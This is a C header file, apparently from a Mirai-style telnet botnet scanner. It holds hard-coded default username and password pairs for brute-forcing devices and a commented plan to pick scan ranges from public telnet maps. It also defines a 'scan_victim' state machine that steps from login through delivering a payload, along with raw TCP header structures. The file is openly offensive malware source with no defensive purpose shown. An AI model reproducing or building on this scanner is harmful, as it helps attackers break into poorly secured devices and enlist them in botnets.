#pragma once

// Need static as it's only in this function

static char *usernames[] =
{
	"root\r\n\0", // root:root
	"root\r\n\0", // root:1234
	"root\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0", // CISCO:CISCO
};

static char *passwords[] =
{
	"root\r\n\0", // root:root
	"1234\r\n\0", // root:1234
	"12345\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0"
};


/*
https://telnetscan.shadowserver.org/
https://telnetscan.shadowserver.org/all/telnet_hilbert_1024_current.png
Good ranges?

static char *ranges[] =
{
	// Add these bitch
};
*/

struct pseudo_header
{ //needed for checksum calculation
	unsigned int   source_address;
	unsigned int   dest_address;
	unsigned char  placeholder;
	unsigned char  protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

struct scan_victim
{
	ipv4_t ip;
	enum
	{
		CONNECTING,
		USERNAME,
		PASSWORD,
		PAYLOAD,
		FINISHED,
	} state;
	int32_t sock;
	uint8_t user;
	uint8_t pass;
};

void scan_init();
bool scan_scanner();